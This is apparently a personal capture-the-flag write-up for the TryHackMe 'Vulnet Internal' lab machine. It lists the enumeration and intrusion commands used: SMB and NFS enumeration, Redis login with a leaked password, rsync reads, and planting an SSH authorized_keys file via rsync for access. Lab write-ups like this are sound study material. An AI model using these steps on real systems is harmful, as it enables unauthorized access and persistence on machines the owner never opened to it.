# 35. Vulnet Internal ğŸ§­
Names | Details
--------|-----
Source | tryhackme
Level | medium
Os | linux

**Notes :**




## Gaining Access ğŸ˜‰
- smb port 139 open, used enum4linux to get username, flag got on further enum
- port 111 open which running rcpbind [further reference](https://book.hacktricks.xyz/pentesting/pentesting-rpcbind)
- redis database running on default port
- nfs running, which can be mouted using [[#Important commands ğŸ”¥]]1
- redis.conf file contains password
- redis to get internal flag [[#Important commands ğŸ”¥]]3
- command to list auths `lrange authlist 0 -1` reddis
- used rsync to read uesr.txt [[#Important commands ğŸ”¥]]4
- ssh keygen
- Then I renamed my â€œ.pubâ€ file to â€œauthorized_keysâ€ so that way I was able to upload it directly with [[#Important commands ğŸ”¥]]5
- 



## Maintaining Access ğŸ¥·
- 

## Important commands ğŸ”¥
1. mount nfs
	```
	sudo mount -t nfs 10.10.51.255:/opt/conf conf
	```
2. redis login
	```
	redis-cli -h ip
	AUTH <pass>
	info
	```
3. redis-dump
	```
	redis-dump -h 10.10.51.255 -a B65Hx562F@ggAZ@F
	```
4. rsync
	```
	rsync rsync://rsync-connect@'10.10.51.255'/files/sys-internal/
	rsync -v rsync://rsync-connect@'10.10.51.255'/files/sys-internal/user.txt .
	```
5. uploading ssh with rsync
	```
	rsync -a /home/nms/Desktop/Boxes/vulnetinternal/authorized_keys rsync://rsync-connect@'10.10.51.255'/files/sys-internal/.ssh/
	```
## Post Exploitation âœ´ï¸
- first flag on smb
- reffer [[#Important commands ğŸ”¥]]3
- User flag : /home/user
- Root flag : /root/root
## Tips ğŸ’¡
- just try with sudo 
- smb shares can be listed `smbclient -L //'machine-ip'/ -N`
- check `/ ` last
- 


--------------------------------
**By Nibras Muhammed** ğŸ¤“ğŸ–¥ï¸
